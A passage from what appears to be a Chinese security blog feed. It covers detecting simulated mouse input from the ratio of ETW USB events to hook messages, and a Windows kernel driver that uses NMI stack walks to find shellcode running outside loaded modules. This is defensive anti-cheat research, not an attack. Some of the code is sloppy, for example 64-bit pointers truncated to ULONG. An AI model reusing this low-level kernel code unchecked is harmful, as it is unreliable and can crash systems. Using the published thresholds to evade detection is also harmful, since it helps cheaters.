f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>发现只有 +80 字节有差异，要么是 0xd0 要么是 0x90，没有别的情况，其它的数据基本一模一样了。</p><p>因此从协议去分析，直接卒了。</p><h3 id="鼠标模拟检测"><a href="#鼠标模拟检测" class="headerlink" title="鼠标模拟检测"></a>鼠标模拟检测</h3><p>前面分析过，长度为 9 的数据是鼠标信息，经过测试，每次移动（大约 0.5 - 1.5 个像素），点击或者其它的鼠标操作都会触发 etw，当然模拟的同样不会触发，那么消息钩子和etw事件数是否会有一定的联系呢？答案是肯定的，这里稍微改一下，然后让左键输出 etwCount 和 win32Count 的值以及比值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/07/08/etw/7.png" class=""><p>基本是可以得到结论 <code>etwCount / win32Count</code> 大概是在 2 左右的比值，可能有略微的浮动，</p><p>可以设置一个比较低的阈值，比如 1.5，如果发现低于这个值则直接判定为使用了鼠标模拟，这里略微改一下左键的事件可以达到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="type">double</span> rate = <span class="number">1.0</span> * etwCount / win32Count;</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">        <span class="keyword">if</span> (rate &lt; <span class="number">1.5</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim detected\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim not found\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        etwCount = <span class="number">0</span>;</span><br><span class="line">        win32Count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况刚才已经试验过了，肯定是不会触发的，这里使用一款鼠标模拟器[3]去点击看看能否检测到，因为存在延时的缘故，建议移动之后等待 2s 左右再按下左键。</p><img src="/2024/07/08/etw/8.png" class=""><p>在经过一系列移动之后点击左键显然也可以成功检测到模拟器。</p><h3 id="方案实现"><a href="#方案实现" class="headerlink" title="方案实现"></a>方案实现</h3><p>鼠标模拟检测方案需要上最终实现的话还有很多问题需要解决，大概罗列了一些。</p><ul><li>etw 事件是异步的，etw事件上报延时需要考虑。</li><li>不同操作系统的事件上报协议可能有所不同，需要对大部分主流的 windows 版本都做适配才能放入最终方案。</li><li>因为只检测了指定 usb3.0 的provider 给定的事件，如果鼠标-键盘设备不是走 usb 协议（如蓝牙鼠标或键盘）则可能会误报。但是个人测试下来，一般笔记本内置和常见的有线外接键盘鼠标都可以被检测到。</li></ul><p>对于以上的问题，也提出几个可能解决的方案。对于第一个异步的问题，既然没有办法让 etw 变为同步上报，那么可以考虑适当放宽检测条件平衡这个误差。例如，取 60 秒时间内产生的鼠标-键盘消息和etw事件，计算比例看是否在合理的范围内。或者取 10w 次的etw事件为阈值，判断这期间内的鼠标键盘消息是否高于 5w（5w为鼠标，键盘则需要放低到 2.5w 左右），若高于则直接判定为使用了模拟器。</p><p>对于第二个问题，不同版本的操作系统协议确实也是一个大问题，因为微软没有官方的文档指示如何解析上报事件的协议，因此对于不同版本的操作系统只能是尽可能去测试完善得到最终方案。</p><p>对于第三个问题，游戏方如果强制玩家使用 usb3.0 协议的鼠标，则会显得不够亲民，但是是最简单暴力的办法。或者去研究蓝牙设备的etw事件，对此做适配。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-</a></li><li>[2]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3</a></li><li>[3]：<a href="https://github.com/taojy123/KeymouseGo">https://github.com/taojy123/KeymouseGo</a></li></ul>]]></content>
    
    
    <summary type="html">尝试做一做模拟类外挂检测</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Gamesec" scheme="https://xia0ji233.github.io/categories/Windows/Gamesec/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows驱动开发（13）——shellcode查找</title>
    <link href="https://xia0ji233.github.io/2024/06/28/driver13/"/>
    <id>https://xia0ji233.github.io/2024/06/28/driver13/</id>
    <published>2024-06-28T10:00:00.000Z</published>
    <updated>2024-06-28T10:02:51.676Z</updated>
    
    <content type="html"><![CDATA[<p>驱动层捕获无模块shellcode。</p><span id="more"></span><p>这里学一手扫描 shellcode 的方法，题目来源于 2024 年的腾讯游戏安全竞赛的决赛。</p><h2 id="扫描shellcode"><a href="#扫描shellcode" class="headerlink" title="扫描shellcode"></a>扫描shellcode</h2><p>主要方法是插中断扫栈和扫内存。这里调几个复现了的方法去讲，中断有 DPC，NMI，IPI 这几类。扫内存可以扫 BigPool，扫页表，扫物理内存。</p><h3 id="NMI"><a href="#NMI" class="headerlink" title="NMI"></a>NMI</h3><p>NMI (Non Maskable Interrupt)——不可屏蔽中断（即CPU不能屏蔽）无论状态寄存器中 IF 位的状态如何，CPU收到有效的NMI必须进行响应，它在被响应时无中断响应周期。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line">ULONG64 num = <span class="number">0</span>;</span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall *_HalSendNMI)</span><span class="params">(ULONG64 a1)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAFFINITY_EX</span> &#123;</span></span><br><span class="line">    SHORT Count;</span><br><span class="line">    SHORT Size;</span><br><span class="line">    ULONG Padding;</span><br><span class="line">    ULONG64 bitmap[<span class="number">20</span>];</span><br><span class="line">&#125; KAFFINITYEX, * PKAFFINITYEX;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall* _KeInitializeAffinityEx)</span><span class="params">(PKAFFINITYEX pkaff)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall* _KeAddProcessorAffinityEx)</span><span class="params">(PKAFFINITYEX pkaff, ULONG nmu)</span>;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Unknow1;</span><br><span class="line">    ULONG Unknow2;</span><br><span class="line">    ULONG Unknow3;</span><br><span class="line">    ULONG Unknow4;</span><br><span class="line">    PVOID Base;</span><br><span class="line">    ULONG Size;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT Index;</span><br><span class="line">    USHORT NameLength;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT ModuleNameOffset;</span><br><span class="line">    <span class="type">char</span> ImageName[<span class="number">256</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Count;<span class="comment">//内核中以加载的模块的个数</span></span><br><span class="line">    SYSTEM_MODULE_INFORMATION_ENTRY Module[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID callers[<span class="number">20</span>];</span><br><span class="line">ULONG count = <span class="number">20</span>;</span><br><span class="line">ULONG numFrames = <span class="number">0</span>;</span><br><span class="line">PVOID ModuleBase[<span class="number">2000</span>];</span><br><span class="line">ULONG ModuleSize[<span class="number">2000</span>];</span><br><span class="line">ULONG CountOfModule = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DRIVERUNLOAD</span><span class="params">(_In_ <span class="keyword">struct</span> _DRIVER_OBJECT* DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;unload\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">NmiCallbackForCheck</span><span class="params">(PVOID Context,BOOLEAN handule)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">NMISearch</span><span class="params">()</span> &#123;</span><br><span class="line">    NTSTATUS status; </span><br><span class="line">    PVOID NmiCallbackHandle; </span><br><span class="line">    ULONG ProcessorCount; </span><br><span class="line">    KAFFINITYEX NmiAffinity;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SystemRoutineName;</span><br><span class="line">    ULONG numCors = KeQueryActiveProcessorCountEx(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;HalSendNMI&quot;</span>);</span><br><span class="line">    _HalSendNMI HalSendNMI = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!HalSendNMI) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get HalSendNMI address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;KeInitializeAffinityEx&quot;</span>);</span><br><span class="line">    _KeInitializeAffinityEx KeInitializeAffinityEx = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!KeInitializeAffinityEx) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get KeInitializeAffinityEx address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;KeAddProcessorAffinityEx&quot;</span>);</span><br><span class="line">    _KeAddProcessorAffinityEx KeAddProcessorAffinityEx = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!KeAddProcessorAffinityEx) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get KeAddProcessorAffinityEx address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取CPU逻辑核心数量</span></span><br><span class="line">    ProcessorCount = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册NMI回调函数</span></span><br><span class="line">    NmiCallbackHandle = KeRegisterNmiCallback(NmiCallbackForCheck, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!NmiCallbackHandle) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to register NMI callback\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        <span class="keyword">for</span> (CCHAR i = <span class="number">0</span>; i &lt; (CCHAR)ProcessorCount &amp;&amp; !found; ++i) &#123;</span><br><span class="line">            KeInitializeAffinityEx(&amp;NmiAffinity);</span><br><span class="line">            KeAddProcessorAffinityEx(&amp;NmiAffinity, i);</span><br><span class="line">            kprintf((<span class="string">&quot;Registered NMI for processor %d\n&quot;</span>, i));</span><br><span class="line">            HalSendNMI(&amp;NmiAffinity);</span><br><span class="line">            LARGE_INTEGER inTime;</span><br><span class="line">            inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 1 second delay</span></span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">                <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                        flag = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    shellcodeaddr = callers[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                kprintf((<span class="string">&quot;shellcode not found in current NMI\n&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line"></span><br><span class="line">    KeDeregisterNmiCallback(NmiCallbackHandle);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">GetAllModule</span><span class="params">()</span> &#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        ModuleBase[i] = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">        ModuleSize[i] = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line">        <span class="comment">//kprintf((&quot;%S:%p~%p\n&quot;),Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG)(Tmp-&gt;DllBase)+(ULONG)(Tmp-&gt;SizeOfImage));</span></span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    CountOfModule = i;</span><br><span class="line">    ULONG Size = (ULONG)(g_Object-&gt;DriverSize);<span class="comment">//把自身的地址和大小也加进去</span></span><br><span class="line">    ModuleBase[CountOfModule] = g_Object-&gt;DriverStart;</span><br><span class="line">    ModuleSize[CountOfModule++] = Size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Hello xia0ji233\n&quot;</span>)); </span><br><span class="line">    pDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class="line">    g_Object = pDriver;</span><br><span class="line">    GetAllModule();</span><br><span class="line">    NTSTATUS status = NMISearch();</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;NMICallBack failed with status 0x%x\n&quot;</span>, status));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>向所有 CPU 发送 NMI，打断CPU执行，执行栈回溯，保存下栈的值，NMI 响应完成之后马上去分析栈的值，是否有不在模块范围内的值，如果有就直接输出，说明找到了 shellcode。</p><p>需要注意的是，因为自身驱动加载的过程中，还没有加载进去，因此遍历模块的时候需要额外加上自身模块的地址，否则容易找到正在执行的 DriverEntry。自身模块的地址和大小可以使用 <code>pDriver-&gt;Start</code> 和 <code>pDriver-&gt;DriverSize</code> 获得。</p><p>执行结果：</p><img src="/2024/06/28/driver13/1.png" class=""><p>NMI 回调中，返回 0 会直接蓝屏，返回 1 则会继续处理。并且 NMI 中断优先级很高，保存栈情况即可，不要调用 DbgPrint 和其它一些操作。</p><h3 id="IPI"><a href="#IPI" class="headerlink" title="IPI"></a>IPI</h3><p><strong>处理器间中断</strong>（英语：Inter-Processor Interrupt，IPI）是一种特殊类型的中断，即在多处理器系统中，如果中断处理器需要来自其它处理器的动作，一个处理器向另一个处理器发出的中断行为。</p><p>IPI 同样是一种高优先级的中断，方法也几乎是一模一样的，只需要调用 API KeIpiGenericCall 就可以让所有的核心都打断执行同一个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR <span class="title function_">IpiBroadcastFunction</span><span 